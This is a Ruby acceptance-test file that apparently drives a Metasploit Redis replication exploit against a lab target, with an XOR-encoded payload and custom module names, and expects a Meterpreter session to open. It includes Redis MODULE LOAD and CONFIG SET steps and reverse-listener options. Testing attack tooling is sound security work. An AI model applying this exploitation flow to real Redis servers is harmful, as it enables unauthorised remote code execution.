# frozen_string_literal: true

require_relative '../redis_replication_custom/acceptance'

module Acceptance
  # Actual XOR decoding and custom paths follow independent SDK/loader controls.
  module RedisReplicationOptions
    include RedisReplicationCustom

    ENCODER = 'x64/xor'
    CUSTOM_FILE = 'module target é.so'
    CUSTOM_INIT = 'mcv_named_1'
    CUSTOM_TRIGGER = 'mcv.named_1'

    def rr_boot
      super
      path = '/data/' + CUSTOM_FILE
      original = rr_cli('CONFIG', 'GET', 'dbfilename').lines.last.chomp
      loaded = false
      begin
        target_exec('target', 'test', '!', '-e', path)
        rr_copy(@rr.fetch(:native_text).fetch('path'), path)
        expect(rr_cli('CONFIG', 'SET', 'dbfilename', CUSTOM_FILE)).to eq("OK\n")
        expect(rr_cli('CONFIG', 'GET', 'dbfilename')).to eq("dbfilename\n#{CUSTOM_FILE}\n")
        expect(rr_cli('MODULE', 'LOAD', path)).to eq("OK\n")
        loaded = true
      ensure
        expect(rr_cli('MODULE', 'UNLOAD', 'mcvnativec')).to eq("OK\n") if loaded
        expect(rr_cli('CONFIG', 'SET', 'dbfilename', original)).to eq("OK\n")
        target_exec('target', 'rm', '-f', path)
      end
      expect(rr_state).to eq(@rr.fetch(:baseline))
      @rr[:native_custom_filename_passed] = true
      rr_save
    ensure
      rr_save
    end

    def rr_native_payload
      super('ENCODER' => ENCODER)
    end

    def rr_use(owner, label)
      wait_for_expect(90, 0.1) do
        @rr_encoding = rr_json("framework.sessions.filter_map{|id,s|next unless s.via_exploit==#{owner.inspect};e=s.exploit;v=e.payload;{id:id,encoder:v.encoder&.refname,encoded_sha256:Digest::SHA256.hexdigest(v.encoded),self_write:v.encoded.include?([0x48,0x31,0x58,0x27].pack('C*')),compiled_bytes:File.read(File.join(Msf::Config.data_directory,'exploits','redis','module.c')).include?(Msf::Simple::Buffer.transform(v.encoded,'c','buf')),init:e.instance_variable_get(:@module_init_name),trigger:e.instance_variable_get(:@module_cmd),file:e.respond_to?(:module_file) ? e.module_file.dup.force_encoding(Encoding::UTF_8) : nil}}.first")
        expect(@rr_encoding).not_to be_nil
      end
      expect(@rr_encoding.fetch('encoder')).to eq(ENCODER)
      expect(@rr_encoding.fetch('self_write')).to be(true)
      expect(@rr_encoding.fetch('compiled_bytes')).to be(true)
      (@rr[:encodings] ||= []) << @rr_encoding.merge('label' => label)
      super
    end

    def rro_run(label, index, names: false)
      port = (names ? 4460 : 4450) + index
      options = {
        'LHOST' => listener_host, 'LPORT' => port, 'SRVHOST' => listener_host,
        'SRVPORT' => 6380, 'ENCODER' => ENCODER
      }
      options.merge!('RedisModuleInit' => CUSTOM_INIT, 'RedisModuleTrigger' => CUSTOM_TRIGGER, 'RedisModuleName' => CUSTOM_FILE) if names
      output = run_target_module(RedisReplication::OWNER, 'target', options, action: 'run -z', command_timeout: 180, reuse_module: index.positive?)
      expect(output).to include('Compile redis module extension file', 'Payload generated successfully!')
      expect(output).to match(/Meterpreter session \d+ opened/)
      @rr[:owning_compilations] ||= []
      @rr[:owning_compilations] << rrc_compile('capture', "#{label}-#{index}")
      rr_use(RedisReplication::OWNER, "#{label}-#{index}")
      if names
        expect(@rr_encoding.values_at('init', 'trigger', 'file')).to eq([CUSTOM_INIT, CUSTOM_TRIGGER, CUSTOM_FILE])
      end
      state = rr_state
      @rr[:post_owner] << state
      rr_save
      expect(state).to eq(@rr.fetch(:baseline))
    end
  end
end
